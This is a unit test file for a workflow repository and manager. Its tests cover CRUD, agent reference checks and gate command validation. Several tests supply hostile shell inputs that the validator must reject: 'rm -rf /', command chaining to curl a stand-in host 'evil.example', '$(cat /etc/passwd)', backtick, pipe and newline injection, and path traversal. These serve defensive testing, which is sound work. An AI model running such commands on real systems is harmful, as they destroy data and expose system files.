/**
 * SpaceWorkflow Unit Tests
 *
 * Covers:
 * - Repository: full CRUD with step management
 * - Repository: getWorkflowsReferencingAgent
 * - Repository: JSON round-trips (rules, tags, gates)
 * - Manager: name uniqueness within space
 * - Manager: at-least-one-step validation
 * - Manager: builtin agent ref validation (planner/coder/general valid, 'leader' rejected)
 * - Manager: custom agent ref validation via SpaceAgentLookup
 * - Manager: gate command validation (quality_check allowlist, custom relative path, no ..)
 * - Manager: timeoutMs bounds (0–300000)
 * - Manager: step ordering via array position
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { rmSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { Database as BunDatabase } from 'bun:sqlite';
import { runMigrations } from '../../../src/storage/schema/index.ts';
import { SpaceWorkflowRepository } from '../../../src/storage/repositories/space-workflow-repository.ts';
import {
	SpaceWorkflowManager,
	WorkflowValidationError,
} from '../../../src/lib/space/managers/space-workflow-manager.ts';
import type { SpaceAgentLookup } from '../../../src/lib/space/managers/space-workflow-manager.ts';
import type { WorkflowGate, WorkflowStepInput } from '@neokai/shared';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeDb(): { db: BunDatabase; dir: string } {
	const dir = join(process.cwd(), 'tmp', 'test-space-workflow', `t-${Date.now()}-${Math.random()}`);
	mkdirSync(dir, { recursive: true });
	const db = new BunDatabase(join(dir, 'test.db'));
	db.exec('PRAGMA foreign_keys = ON');
	runMigrations(db, () => {});
	return { db, dir };
}

function seedSpace(db: BunDatabase, spaceId = 'space-1'): void {
	db.prepare(
		`INSERT INTO spaces (id, workspace_path, name, description, background_context, instructions,
     allowed_models, session_ids, status, created_at, updated_at)
     VALUES (?, ?, ?, '', '', '', '[]', '[]', 'active', ?, ?)`
	).run(spaceId, `/tmp/ws-${spaceId}`, `Space ${spaceId}`, Date.now(), Date.now());
}

function seedAgent(db: BunDatabase, agentId: string, spaceId: string, name: string): void {
	db.prepare(
		`INSERT INTO space_agents (id, space_id, name, description, model, tools, system_prompt,
     config, created_at, updated_at)
     VALUES (?, ?, ?, '', null, '[]', '', null, ?, ?)`
	).run(agentId, spaceId, name, Date.now(), Date.now());
}

const coderStep: WorkflowStepInput = { name: 'Code', agentRefType: 'builtin', agentRef: 'coder' };
const plannerStep: WorkflowStepInput = {
	name: 'Plan',
	agentRefType: 'builtin',
	agentRef: 'planner',
};
const generalStep: WorkflowStepInput = {
	name: 'Review',
	agentRefType: 'builtin',
	agentRef: 'general',
};

// ---------------------------------------------------------------------------
// Setup
// ---------------------------------------------------------------------------

describe('SpaceWorkflowRepository', () => {
	let db: BunDatabase;
	let dir: string;
	let repo: SpaceWorkflowRepository;

	beforeEach(() => {
		({ db, dir } = makeDb());
		seedSpace(db);
		repo = new SpaceWorkflowRepository(db);
	});

	afterEach(() => {
		try {
			db.close();
		} catch {
			/* ignore */
		}
		try {
			rmSync(dir, { recursive: true, force: true });
		} catch {
			/* ignore */
		}
	});

	// -------------------------------------------------------------------------
	// CRUD
	// -------------------------------------------------------------------------

	test('createWorkflow returns workflow with generated id and steps', () => {
		const wf = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'My Workflow',
			steps: [coderStep, plannerStep],
		});

		expect(wf.id).toBeTruthy();
		expect(wf.spaceId).toBe('space-1');
		expect(wf.name).toBe('My Workflow');
		expect(wf.steps).toHaveLength(2);
		expect(wf.steps[0].name).toBe('Code');
		expect(wf.steps[0].order).toBe(0);
		expect(wf.steps[0].agentRefType).toBe('builtin');
		expect(wf.steps[0].agentRef).toBe('coder');
		expect(wf.steps[1].order).toBe(1);
		expect(wf.tags).toEqual([]);
		expect(wf.rules).toEqual([]);
	});

	test('createWorkflow stores tags and config', () => {
		const wf = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'Tagged',
			steps: [coderStep],
			tags: ['ci', 'deploy'],
			config: { priority: 'high' },
		});
		expect(wf.tags).toEqual(['ci', 'deploy']);
		expect(wf.config).toEqual({ priority: 'high' });
	});

	test('getWorkflow returns null for missing id', () => {
		expect(repo.getWorkflow('no-such-id')).toBeNull();
	});

	test('getWorkflow round-trips all fields', () => {
		const created = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'Full',
			description: 'A full workflow',
			steps: [coderStep],
			rules: [{ name: 'Rule1', content: 'Follow TDD', appliesTo: [] }],
			tags: ['a', 'b'],
			config: { key: 'value' },
		});

		const fetched = repo.getWorkflow(created.id)!;
		expect(fetched.name).toBe('Full');
		expect(fetched.description).toBe('A full workflow');
		expect(fetched.tags).toEqual(['a', 'b']);
		expect(fetched.rules).toHaveLength(1);
		expect(fetched.rules[0].name).toBe('Rule1');
		expect(fetched.rules[0].id).toBeTruthy(); // assigned by repo
		expect(fetched.config).toEqual({ key: 'value' });
	});

	test('listWorkflows returns all workflows for a space', () => {
		repo.createWorkflow({ spaceId: 'space-1', name: 'WF1', steps: [coderStep] });
		repo.createWorkflow({ spaceId: 'space-1', name: 'WF2', steps: [plannerStep] });
		// Another space — should not appear
		seedSpace(db, 'space-2');
		repo.createWorkflow({ spaceId: 'space-2', name: 'WF3', steps: [coderStep] });

		const wfs = repo.listWorkflows('space-1');
		expect(wfs).toHaveLength(2);
		expect(wfs.map((w) => w.name).sort()).toEqual(['WF1', 'WF2']);
	});

	test('updateWorkflow updates name and description', () => {
		const wf = repo.createWorkflow({ spaceId: 'space-1', name: 'Old Name', steps: [coderStep] });
		const updated = repo.updateWorkflow(wf.id, { name: 'New Name', description: 'Updated desc' });
		expect(updated?.name).toBe('New Name');
		expect(updated?.description).toBe('Updated desc');
	});

	test('updateWorkflow bumps updatedAt on step-only update', async () => {
		const wf = repo.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
		const before = wf.updatedAt;
		// Small delay to ensure timestamp difference
		await new Promise((r) => setTimeout(r, 2));
		const updated = repo.updateWorkflow(wf.id, {
			steps: [{ id: 'x', order: 0, name: 'Plan', agentRefType: 'builtin', agentRef: 'planner' }],
		});
		expect(updated?.updatedAt).toBeGreaterThan(before);
	});

	test('updateWorkflow replaces all steps on steps param', () => {
		const wf = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'WF',
			steps: [coderStep, plannerStep],
		});
		expect(wf.steps).toHaveLength(2);

		const updated = repo.updateWorkflow(wf.id, {
			steps: [
				{ id: 'ignored', order: 0, name: 'Review', agentRefType: 'builtin', agentRef: 'general' },
			],
		});
		expect(updated?.steps).toHaveLength(1);
		expect(updated?.steps[0].agentRef).toBe('general');
	});

	test('updateWorkflow returns null for missing id', () => {
		expect(repo.updateWorkflow('missing', { name: 'X' })).toBeNull();
	});

	test('deleteWorkflow removes the workflow and its steps', () => {
		const wf = repo.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
		expect(repo.deleteWorkflow(wf.id)).toBe(true);
		expect(repo.getWorkflow(wf.id)).toBeNull();

		// Steps should be gone (CASCADE)
		const rows = db.prepare(`SELECT * FROM space_workflow_steps WHERE workflow_id = ?`).all(wf.id);
		expect(rows).toHaveLength(0);
	});

	test('deleteWorkflow returns false for missing id', () => {
		expect(repo.deleteWorkflow('no-such-id')).toBe(false);
	});

	// -------------------------------------------------------------------------
	// getWorkflowsReferencingAgent
	// -------------------------------------------------------------------------

	test('getWorkflowsReferencingAgent returns workflows with matching custom agent', () => {
		seedAgent(db, 'agent-1', 'space-1', 'Alpha');
		const wf = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'WF With Custom',
			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'agent-1' }],
		});
		const results = repo.getWorkflowsReferencingAgent('agent-1');
		expect(results).toHaveLength(1);
		expect(results[0].id).toBe(wf.id);
	});

	test('getWorkflowsReferencingAgent returns empty for unmatched agent', () => {
		repo.createWorkflow({
			spaceId: 'space-1',
			name: 'WF',
			steps: [coderStep],
		});
		expect(repo.getWorkflowsReferencingAgent('no-such-agent')).toHaveLength(0);
	});

	test('getWorkflowsReferencingAgent ignores builtin steps', () => {
		repo.createWorkflow({
			spaceId: 'space-1',
			name: 'WF Builtin',
			steps: [coderStep, plannerStep],
		});
		expect(repo.getWorkflowsReferencingAgent('coder')).toHaveLength(0);
	});

	// -------------------------------------------------------------------------
	// JSON round-trips
	// -------------------------------------------------------------------------

	test('JSON round-trip: entryGate and exitGate on steps', () => {
		const entry: WorkflowGate = { type: 'human_approval', description: 'Please review' };
		const exit: WorkflowGate = {
			type: 'quality_check',
			command: 'bun test',
			timeoutMs: 60000,
			maxRetries: 2,
		};
		const step: WorkflowStepInput = {
			name: 'Code',
			agentRefType: 'builtin',
			agentRef: 'coder',
			entryGate: entry,
			exitGate: exit,
			instructions: 'Write clean code',
		};

		const wf = repo.createWorkflow({ spaceId: 'space-1', name: 'Gated', steps: [step] });
		const fetched = repo.getWorkflow(wf.id)!;
		const s = fetched.steps[0];

		expect(s.entryGate?.type).toBe('human_approval');
		expect(s.entryGate?.description).toBe('Please review');
		expect(s.exitGate?.type).toBe('quality_check');
		expect(s.exitGate?.command).toBe('bun test');
		expect(s.exitGate?.timeoutMs).toBe(60000);
		expect(s.exitGate?.maxRetries).toBe(2);
		expect(s.instructions).toBe('Write clean code');
	});

	test('JSON round-trip: rules with appliesTo', () => {
		const wf = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'WF',
			steps: [coderStep],
			rules: [
				{ name: 'R1', content: 'Always test', appliesTo: ['step-id-1'] },
				{ name: 'R2', content: 'No shortcuts' },
			],
		});
		const fetched = repo.getWorkflow(wf.id)!;
		expect(fetched.rules).toHaveLength(2);
		expect(fetched.rules[0].appliesTo).toEqual(['step-id-1']);
		expect(fetched.rules[1].appliesTo).toBeUndefined();
	});

	test('JSON round-trip: custom step stores agentRef as agent_id', () => {
		seedAgent(db, 'agent-99', 'space-1', 'MyAgent');
		const wf = repo.createWorkflow({
			spaceId: 'space-1',
			name: 'Custom WF',
			steps: [{ name: 'Custom Step', agentRefType: 'custom', agentRef: 'agent-99' }],
		});
		const fetched = repo.getWorkflow(wf.id)!;
		expect(fetched.steps[0].agentRefType).toBe('custom');
		expect(fetched.steps[0].agentRef).toBe('agent-99');

		// Verify agent_id column is set
		const row = db
			.prepare('SELECT agent_id FROM space_workflow_steps WHERE workflow_id = ?')
			.get(wf.id) as { agent_id: string };
		expect(row.agent_id).toBe('agent-99');
	});
});

// ---------------------------------------------------------------------------
// Manager tests
// ---------------------------------------------------------------------------

describe('SpaceWorkflowManager', () => {
	let db: BunDatabase;
	let dir: string;
	let repo: SpaceWorkflowRepository;
	let manager: SpaceWorkflowManager;

	beforeEach(() => {
		({ db, dir } = makeDb());
		seedSpace(db);
		repo = new SpaceWorkflowRepository(db);
		manager = new SpaceWorkflowManager(repo, null);
	});

	afterEach(() => {
		try {
			db.close();
		} catch {
			/* ignore */
		}
		try {
			rmSync(dir, { recursive: true, force: true });
		} catch {
			/* ignore */
		}
	});

	// -------------------------------------------------------------------------
	// Name uniqueness
	// -------------------------------------------------------------------------

	test('createWorkflow throws if name already exists in space', () => {
		manager.createWorkflow({ spaceId: 'space-1', name: 'Dup', steps: [coderStep] });
		expect(() =>
			manager.createWorkflow({ spaceId: 'space-1', name: 'Dup', steps: [plannerStep] })
		).toThrow(WorkflowValidationError);
	});

	test('createWorkflow allows same name in different spaces', () => {
		seedSpace(db, 'space-2');
		manager.createWorkflow({ spaceId: 'space-1', name: 'Same', steps: [coderStep] });
		// Should not throw
		const wf2 = manager.createWorkflow({ spaceId: 'space-2', name: 'Same', steps: [coderStep] });
		expect(wf2.name).toBe('Same');
	});

	test('updateWorkflow throws if new name conflicts with another workflow', () => {
		manager.createWorkflow({ spaceId: 'space-1', name: 'Existing', steps: [coderStep] });
		const wf = manager.createWorkflow({ spaceId: 'space-1', name: 'WF2', steps: [plannerStep] });
		expect(() => manager.updateWorkflow(wf.id, { name: 'Existing' })).toThrow(
			WorkflowValidationError
		);
	});

	test('updateWorkflow allows keeping the same name', () => {
		const wf = manager.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
		const updated = manager.updateWorkflow(wf.id, { name: 'WF' });
		expect(updated?.name).toBe('WF');
	});

	test('name is trimmed before storage — whitespace variants collide', () => {
		manager.createWorkflow({ spaceId: 'space-1', name: 'Foo', steps: [coderStep] });
		// '  Foo  ' should trim to 'Foo' and fail uniqueness
		expect(() =>
			manager.createWorkflow({ spaceId: 'space-1', name: '  Foo  ', steps: [plannerStep] })
		).toThrow(WorkflowValidationError);
	});

	test('name is stored trimmed', () => {
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: '  Trimmed  ',
			steps: [coderStep],
		});
		expect(wf.name).toBe('Trimmed');
	});

	// -------------------------------------------------------------------------
	// At-least-one-step
	// -------------------------------------------------------------------------

	test('createWorkflow throws when steps is empty', () => {
		expect(() => manager.createWorkflow({ spaceId: 'space-1', name: 'Empty', steps: [] })).toThrow(
			WorkflowValidationError
		);
	});

	test('createWorkflow throws when steps is not provided (defaults to empty)', () => {
		expect(() => manager.createWorkflow({ spaceId: 'space-1', name: 'NoSteps' })).toThrow(
			WorkflowValidationError
		);
	});

	test('updateWorkflow throws when replacing with empty steps', () => {
		const wf = manager.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
		expect(() => manager.updateWorkflow(wf.id, { steps: [] })).toThrow(WorkflowValidationError);
	});

	test('updateWorkflow throws when steps is null (treated as empty replacement)', () => {
		const wf = manager.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
		expect(() => manager.updateWorkflow(wf.id, { steps: null as unknown as [] })).toThrow(
			WorkflowValidationError
		);
	});

	// -------------------------------------------------------------------------
	// Agent ref validation — builtins
	// -------------------------------------------------------------------------

	test('createWorkflow accepts all valid builtin roles', () => {
		for (const role of ['planner', 'coder', 'general'] as const) {
			const wf = manager.createWorkflow({
				spaceId: 'space-1',
				name: `WF-${role}`,
				steps: [{ name: 'Step', agentRefType: 'builtin', agentRef: role }],
			});
			expect(wf.steps[0].agentRef).toBe(role);
		}
	});

	test('createWorkflow rejects leader as builtin agentRef', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Leader WF',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'leader' as unknown as 'planner',
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('createWorkflow rejects unknown builtin agentRef', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Bad Builtin WF',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'executor' as unknown as 'planner',
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	// -------------------------------------------------------------------------
	// Agent ref validation — custom (via SpaceAgentLookup)
	// -------------------------------------------------------------------------

	test('createWorkflow accepts custom ref when agent exists', () => {
		seedAgent(db, 'agent-1', 'space-1', 'MyAgent');
		const lookup: SpaceAgentLookup = {
			getAgentById: (_spaceId, id) =>
				id === 'agent-1' ? { id: 'agent-1', name: 'MyAgent' } : null,
		};
		const mgr = new SpaceWorkflowManager(repo, lookup);
		const wf = mgr.createWorkflow({
			spaceId: 'space-1',
			name: 'Custom WF',
			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'agent-1' }],
		});
		expect(wf.steps[0].agentRef).toBe('agent-1');
	});

	test('createWorkflow rejects custom ref when agent does not exist', () => {
		const lookup: SpaceAgentLookup = {
			getAgentById: () => null,
		};
		const mgr = new SpaceWorkflowManager(repo, lookup);
		expect(() =>
			mgr.createWorkflow({
				spaceId: 'space-1',
				name: 'Bad Custom',
				steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'non-existent-uuid' }],
			})
		).toThrow(WorkflowValidationError);
	});

	test('createWorkflow accepts custom ref when no lookup provided (no validation)', () => {
		// Without agentLookup, custom refs are accepted as-is
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: 'No-Lookup WF',
			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'anything' }],
		});
		expect(wf.steps[0].agentRef).toBe('anything');
	});

	test('createWorkflow rejects empty custom agentRef', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Empty Ref',
				steps: [{ name: 'Step', agentRefType: 'custom', agentRef: '' }],
			})
		).toThrow(WorkflowValidationError);
	});

	// -------------------------------------------------------------------------
	// Gate command validation — quality_check allowlist
	// -------------------------------------------------------------------------

	test('quality_check gate accepts allowlisted commands', () => {
		const allowedCmds = ['bun test', 'npm test', 'npm run lint', 'bun run check', 'make test'];
		for (const cmd of allowedCmds) {
			const wf = manager.createWorkflow({
				spaceId: 'space-1',
				name: `QC-${cmd}`,
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check', command: cmd },
					},
				],
			});
			expect(wf.steps[0].exitGate?.command).toBe(cmd);
		}
	});

	test('quality_check gate rejects non-allowlisted command', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Bad QC',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check', command: 'rm -rf /' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('quality_check gate rejects missing command', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'No Cmd QC',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('quality_check gate rejects shell injection via semicolon', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Inject Semi',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check', command: 'bun test; rm -rf /' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('quality_check gate rejects shell injection via &&', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Inject And',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check', command: 'bun test && curl http://evil.example' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('quality_check gate rejects shell injection via $()', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Inject Sub',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check', command: 'bun test $(cat /etc/passwd)' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	// -------------------------------------------------------------------------
	// Gate command validation — custom relative path
	// -------------------------------------------------------------------------

	test('custom gate accepts valid relative path', () => {
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: 'Custom Gate WF',
			steps: [
				{
					name: 'Step',
					agentRefType: 'builtin',
					agentRef: 'coder',
					exitGate: { type: 'custom', command: './scripts/verify.sh' },
				},
			],
		});
		expect(wf.steps[0].exitGate?.command).toBe('./scripts/verify.sh');
	});

	test('custom gate rejects absolute path', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Abs Path',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: '/etc/passwd' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects path with .. traversal', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Traversal',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: './scripts/../../../etc/passwd' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects command without ./ prefix', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'No Dot Slash',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: 'scripts/verify.sh' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects missing command', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'No Cmd Custom',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects shell injection via semicolon', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Custom Inject Semi',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: './scripts/verify.sh; rm -rf /' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects shell injection via pipe', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Custom Inject Pipe',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: './scripts/verify.sh | cat /etc/passwd' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects shell injection via backtick', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Custom Inject Backtick',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: './scripts/verify.sh `whoami`' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('quality_check gate rejects newline injection', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'QC Newline Inject',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'quality_check', command: 'bun test\nrm -rf /' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('custom gate rejects newline injection', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Custom Newline Inject',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'custom', command: './scripts/verify.sh\nrm -rf /' },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	// -------------------------------------------------------------------------
	// Gate timeoutMs validation
	// -------------------------------------------------------------------------

	test('gate accepts timeoutMs = 0', () => {
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: 'Zero Timeout',
			steps: [
				{
					name: 'Step',
					agentRefType: 'builtin',
					agentRef: 'coder',
					exitGate: { type: 'human_approval', timeoutMs: 0 },
				},
			],
		});
		expect(wf.steps[0].exitGate?.timeoutMs).toBe(0);
	});

	test('gate accepts timeoutMs = 300000', () => {
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: 'Max Timeout',
			steps: [
				{
					name: 'Step',
					agentRefType: 'builtin',
					agentRef: 'coder',
					exitGate: { type: 'human_approval', timeoutMs: 300_000 },
				},
			],
		});
		expect(wf.steps[0].exitGate?.timeoutMs).toBe(300_000);
	});

	test('gate rejects timeoutMs > 300000', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Over Timeout',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'human_approval', timeoutMs: 300_001 },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('gate rejects negative timeoutMs', () => {
		expect(() =>
			manager.createWorkflow({
				spaceId: 'space-1',
				name: 'Neg Timeout',
				steps: [
					{
						name: 'Step',
						agentRefType: 'builtin',
						agentRef: 'coder',
						exitGate: { type: 'human_approval', timeoutMs: -1 },
					},
				],
			})
		).toThrow(WorkflowValidationError);
	});

	test('deleteWorkflow removes an existing workflow', () => {
		const wf = manager.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
		expect(manager.deleteWorkflow(wf.id)).toBe(true);
		expect(manager.getWorkflow(wf.id)).toBeNull();
	});

	test('deleteWorkflow returns false for non-existent workflow', () => {
		expect(manager.deleteWorkflow('no-such-id')).toBe(false);
	});

	// -------------------------------------------------------------------------
	// Step ordering
	// -------------------------------------------------------------------------

	test('steps are stored and retrieved in array order', () => {
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: 'Ordered',
			steps: [plannerStep, coderStep, generalStep],
		});
		expect(wf.steps[0].name).toBe('Plan');
		expect(wf.steps[0].order).toBe(0);
		expect(wf.steps[1].name).toBe('Code');
		expect(wf.steps[1].order).toBe(1);
		expect(wf.steps[2].name).toBe('Review');
		expect(wf.steps[2].order).toBe(2);
	});

	// -------------------------------------------------------------------------
	// getWorkflowsReferencingAgent
	// -------------------------------------------------------------------------

	test('getWorkflowsReferencingAgent returns workflows using custom agent', () => {
		seedAgent(db, 'agent-1', 'space-1', 'Alpha');
		const wf = manager.createWorkflow({
			spaceId: 'space-1',
			name: 'Uses Alpha',
			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'agent-1' }],
		});
		manager.createWorkflow({
			spaceId: 'space-1',
			name: 'Uses Builtin',
			steps: [coderStep],
		});
		const refs = manager.getWorkflowsReferencingAgent('agent-1');
		expect(refs).toHaveLength(1);
		expect(refs[0].id).toBe(wf.id);
	});
});
